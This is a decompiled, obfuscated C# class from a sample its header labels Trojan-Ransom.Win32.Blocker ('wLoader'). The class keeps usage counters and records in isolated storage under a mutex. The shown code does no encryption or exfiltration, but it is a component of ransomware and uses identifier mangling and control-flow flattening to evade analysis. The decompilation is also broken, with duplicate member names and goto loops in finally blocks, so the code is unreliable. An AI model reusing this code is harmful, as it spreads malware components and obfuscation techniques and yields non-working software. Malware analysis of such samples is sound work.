// Decompiled with JetBrains decompiler
// Type: ?43?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public static class \u003F43\u003F
{
  private static readonly string \u003F0\u003F = \u003F20\u003F.\u003F53\u003F(965).Substring(1, 8);
  private static readonly string \u003F5\u003F = Path.Combine(\u003F43\u003F.\u003F0\u003F, \u003F20\u003F.\u003F53\u003F(1971));
  private static readonly string \u003F9\u003F = Path.Combine(\u003F43\u003F.\u003F0\u003F, \u003F20\u003F.\u003F53\u003F(1988));
  private static readonly string \u003F11\u003F = Path.Combine(\u003F43\u003F.\u003F0\u003F, \u003F20\u003F.\u003F53\u003F(1993));
  private static readonly IsolatedStorageFile \u003F0\u003F;
  private static readonly Encoding \u003F0\u003F = Encoding.UTF8;
  private static readonly HashAlgorithm \u003F0\u003F = (HashAlgorithm) new MD5CryptoServiceProvider();

  static \u003F43\u003F()
  {
    \u003F43\u003F.\u003F0\u003F = IsolatedStorageFile.GetUserStoreForAssembly();
    \u003F43\u003F.\u003F0\u003F.CreateDirectory(\u003F43\u003F.\u003F0\u003F);
    \u003F43\u003F.\u003F0\u003F.CreateDirectory(\u003F43\u003F.\u003F9\u003F);
  }

  private static IDisposable \u003F0\u003F() => (IDisposable) new \u003F43\u003F.\u003F0\u003F(\u003F43\u003F.\u003F11\u003F);

  private static IsolatedStorageFileStream \u003F0\u003F(
    string _param0,
    FileMode _param1,
    FileAccess _param2)
  {
    return new IsolatedStorageFileStream(_param0, _param1, _param2, FileShare.None, \u003F43\u003F.\u003F0\u003F);
  }

  private static void \u003F0\u003F(string _param0)
  {
    try
    {
      \u003F43\u003F.\u003F0\u003F.DeleteFile(_param0);
    }
    catch (IsolatedStorageException ex)
    {
    }
  }

  private static void \u003F0\u003F(string _param0, long _param1)
  {
    using (IsolatedStorageFileStream storageFileStream = \u003F43\u003F.\u003F0\u003F(_param0, FileMode.OpenOrCreate, FileAccess.ReadWrite))
    {
      storageFileStream.Position = _param1 + 8L;
      int num1 = 0;
      ulong num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            storageFileStream.Position = _param1;
            num1 = 1;
            continue;
          case 1:
            num2 = new BinaryReader((Stream) storageFileStream).ReadUInt64();
            num1 = 2;
            continue;
          case 2:
            ++num2;
            num1 = 3;
            continue;
          case 3:
            storageFileStream.Position = _param1;
            num1 = 4;
            continue;
          case 4:
            new BinaryWriter((Stream) storageFileStream).Write(num2);
            num1 = 5;
            continue;
          default:
            goto label_9;
        }
      }
label_9:;
    }
  }

  public static void \u003F60\u003F(uint _param0)
  {
    IDisposable disposable = (IDisposable) null;
    try
    {
      disposable = \u003F43\u003F.\u003F0\u003F();
      \u003F43\u003F.\u003F0\u003F(\u003F43\u003F.\u003F5\u003F, (long) (_param0 * 8U));
    }
    catch (Exception ex)
    {
    }
    finally
    {
      if (disposable != null)
        goto label_5;
label_4:
label_5:
      disposable.Dispose();
      goto label_4;
    }
  }

  private static string \u003F0\u003F(string _param0)
  {
    byte[] bytes = \u003F43\u003F.\u003F0\u003F.GetBytes(_param0);
    int num = 0;
    string str1;
    byte[] hash;
    Guid guid;
    string path2;
    string str2;
    string str3;
    while (true)
    {
      switch (num)
      {
        case 0:
          str1 = Convert.ToBase64String(bytes).Replace('\\', '@');
          num = 1;
          continue;
        case 1:
          if (str1.Length > 50)
          {
            hash = \u003F43\u003F.\u003F0\u003F.ComputeHash(bytes);
            num = 2;
            continue;
          }
          goto label_16;
        case 2:
          guid = new Guid(hash);
          num = 3;
          continue;
        case 3:
          path2 = guid.ToString().Substring(0, 18);
          num = 4;
          continue;
        case 4:
          str2 = Path.Combine(\u003F43\u003F.\u003F9\u003F, path2);
          num = 5;
          continue;
        case 5:
          str1 = str2 + \u003F20\u003F.\u003F53\u003F(1998);
          num = 6;
          continue;
        case 6:
          str3 = str2 + \u003F20\u003F.\u003F53\u003F(2007);
          num = 7;
          continue;
        default:
          goto label_10;
      }
    }
label_10:
    IsolatedStorageFileStream storageFileStream = (IsolatedStorageFileStream) null;
    try
    {
      storageFileStream = \u003F43\u003F.\u003F0\u003F(str3, FileMode.CreateNew, FileAccess.Write);
      storageFileStream.Write(bytes, 0, bytes.Length);
      goto label_17;
    }
    catch (IOException ex)
    {
      goto label_17;
    }
    finally
    {
      storageFileStream?.Close();
    }
label_16:
    str1 = Path.Combine(\u003F43\u003F.\u003F9\u003F, str1 + \u003F20\u003F.\u003F53\u003F(1998));
label_17:
    return str1;
  }

  public static void \u003F60\u003F(string _param0)
  {
    IDisposable disposable = (IDisposable) null;
    try
    {
      disposable = \u003F43\u003F.\u003F0\u003F();
      int num = 0;
      string str;
      while (true)
      {
        switch (num)
        {
          case 0:
            str = \u003F43\u003F.\u003F0\u003F(_param0);
            num = 1;
            continue;
          case 1:
            \u003F43\u003F.\u003F0\u003F(str, 0L);
            num = 2;
            continue;
          default:
            goto label_6;
        }
      }
label_6:;
    }
    catch (Exception ex)
    {
    }
    finally
    {
      disposable?.Dispose();
    }
  }

  private static ulong[] \u003F0\u003F(string _param0)
  {
    ulong[] dst;
    using (IsolatedStorageFileStream storageFileStream = new IsolatedStorageFileStream(_param0, FileMode.OpenOrCreate, FileAccess.Read, FileShare.None, \u003F43\u003F.\u003F0\u003F))
    {
      byte[] numArray = new byte[storageFileStream.Length];
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            storageFileStream.Read(numArray, 0, numArray.Length);
            num = 1;
            continue;
          case 1:
            dst = new ulong[numArray.Length / 8];
            num = 2;
            continue;
          case 2:
            Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 0, numArray.Length);
            num = 3;
            continue;
          default:
            goto label_9;
        }
      }
    }
label_9:
    return dst;
  }

  public static \u003F42\u003F \u003F61\u003F()
  {
    \u003F42\u003F obj1;
    using (\u003F43\u003F.\u003F0\u003F())
    {
      \u003F42\u003F obj2 = \u003F43\u003F.\u003F0\u003F();
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            \u003F43\u003F.\u003F0\u003F();
            num = 1;
            continue;
          case 1:
            obj1 = obj2;
            num = 2;
            continue;
          default:
            goto label_8;
        }
      }
    }
label_8:
    return obj1;
  }

  public static \u003F42\u003F \u003F62\u003F()
  {
    IDisposable disposable = \u003F43\u003F.\u003F0\u003F();
    try
    {
      return \u003F43\u003F.\u003F0\u003F();
    }
    finally
    {
      if (disposable != null)
        goto label_4;
label_3:
label_4:
      disposable.Dispose();
      goto label_3;
    }
  }

  public static void \u003F63\u003F()
  {
    IDisposable disposable = \u003F43\u003F.\u003F0\u003F();
    try
    {
      \u003F43\u003F.\u003F0\u003F();
    }
    finally
    {
      if (disposable != null)
        goto label_4;
label_3:
label_4:
      disposable.Dispose();
      goto label_3;
    }
  }

  private static \u003F42\u003F \u003F0\u003F()
  {
    ulong[] numArray1 = \u003F43\u003F.\u003F0\u003F(\u003F43\u003F.\u003F5\u003F);
    Dictionary<string, ulong> dictionary = new Dictionary<string, ulong>();
    try
    {
      string[] fileNames = \u003F43\u003F.\u003F0\u003F.GetFileNames(\u003F43\u003F.\u003F9\u003F + \u003F20\u003F.\u003F53\u003F(2016));
      int num1 = 0;
      int index;
      string str1;
      string withoutExtension;
      string str2;
      ulong[] numArray2;
      string str3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            index = 0;
            num1 = 1;
            continue;
          case 1:
            if (index < fileNames.Length)
            {
              str1 = fileNames[index];
              num1 = 2;
              continue;
            }
            goto label_23;
          case 2:
            withoutExtension = Path.GetFileNameWithoutExtension(str1);
            num1 = 3;
            continue;
          case 3:
            str2 = Path.Combine(\u003F43\u003F.\u003F9\u003F, str1);
            num1 = 4;
            continue;
          case 4:
            numArray2 = \u003F43\u003F.\u003F0\u003F(str2);
            num1 = 5;
            continue;
          case 5:
            str3 = Path.Combine(\u003F43\u003F.\u003F9\u003F, withoutExtension + \u003F20\u003F.\u003F53\u003F(2007));
            num1 = 6;
            continue;
          case 6:
            IsolatedStorageFileStream storageFileStream = (IsolatedStorageFileStream) null;
            try
            {
              storageFileStream = \u003F43\u003F.\u003F0\u003F(str3, FileMode.Open, FileAccess.Read);
              int num2 = 0;
              byte[] numArray3;
              while (true)
              {
                switch (num2)
                {
                  case 0:
                    numArray3 = new byte[storageFileStream.Length];
                    num2 = 1;
                    continue;
                  case 1:
                    storageFileStream.Read(numArray3, 0, numArray3.Length);
                    num2 = 2;
                    continue;
                  case 2:
                    withoutExtension = \u003F43\u003F.\u003F0\u003F.GetString(numArray3);
                    num2 = 3;
                    continue;
                  default:
                    goto label_19;
                }
              }
            }
            catch (FileNotFoundException ex)
            {
              withoutExtension = \u003F43\u003F.\u003F0\u003F.GetString(Convert.FromBase64String(withoutExtension.Replace('@', '\\')));
            }
            finally
            {
              storageFileStream?.Close();
            }
label_19:
            dictionary[withoutExtension] = numArray2[0];
            num1 = 7;
            continue;
          default:
            ++index;
            goto case 1;
        }
      }
    }
    catch (DirectoryNotFoundException ex)
    {
    }
label_23:
    return new \u003F42\u003F(numArray1, dictionary);
  }

  private static void \u003F0\u003F()
  {
    \u003F43\u003F.\u003F0\u003F(\u003F43\u003F.\u003F5\u003F);
    try
    {
      string[] fileNames = \u003F43\u003F.\u003F0\u003F.GetFileNames(\u003F43\u003F.\u003F9\u003F + \u003F20\u003F.\u003F53\u003F(2016));
      int num = 0;
      int index;
      string str1;
      string withoutExtension;
      string str2;
      string str3;
      while (true)
      {
        switch (num)
        {
          case 0:
            index = 0;
            num = 1;
            continue;
          case 1:
            if (index < fileNames.Length)
            {
              str1 = fileNames[index];
              num = 2;
              continue;
            }
            goto label_13;
          case 2:
            withoutExtension = Path.GetFileNameWithoutExtension(str1);
            num = 3;
            continue;
          case 3:
            str2 = Path.Combine(\u003F43\u003F.\u003F9\u003F, str1);
            num = 4;
            continue;
          case 4:
            \u003F43\u003F.\u003F0\u003F(str2);
            num = 5;
            continue;
          case 5:
            str3 = Path.Combine(\u003F43\u003F.\u003F9\u003F, withoutExtension + \u003F20\u003F.\u003F53\u003F(2007));
            num = 6;
            continue;
          case 6:
            \u003F43\u003F.\u003F0\u003F(str3);
            num = 7;
            continue;
          default:
            ++index;
            goto case 1;
        }
      }
    }
    catch (DirectoryNotFoundException ex)
    {
    }
label_13:
    try
    {
      \u003F43\u003F.\u003F0\u003F.DeleteDirectory(\u003F43\u003F.\u003F9\u003F);
    }
    catch (IsolatedStorageException ex)
    {
    }
    \u003F43\u003F.\u003F0\u003F.CreateDirectory(\u003F43\u003F.\u003F9\u003F);
  }

  private sealed class \u003F0\u003F : IDisposable
  {
    private static readonly CultureInfo \u003F0\u003F = CultureInfo.GetCultureInfo(\u003F20\u003F.\u003F53\u003F(2025));
    private readonly CultureInfo \u003F5\u003F;
    private readonly Mutex \u003F0\u003F;

    public \u003F0\u003F(string _param1)
    {
      this.\u003F5\u003F = Thread.CurrentThread.CurrentUICulture;
      Thread.CurrentThread.CurrentUICulture = \u003F43\u003F.\u003F0\u003F.\u003F0\u003F;
      if (_param1.Length > 260)
        goto label_2;
label_1:
      _param1 = _param1.Replace(Path.DirectorySeparatorChar, '_');
      this.\u003F0\u003F = new Mutex(false, _param1);
      try
      {
        this.\u003F0\u003F.WaitOne();
        return;
      }
      catch (AbandonedMutexException ex)
      {
        return;
      }
label_2:
      _param1 = _param1.Remove(261);
      goto label_1;
    }

    public void Dispose()
    {
      this.\u003F0\u003F.ReleaseMutex();
      this.\u003F0\u003F.Close();
      Thread.CurrentThread.CurrentUICulture = this.\u003F5\u003F;
    }
  }
}
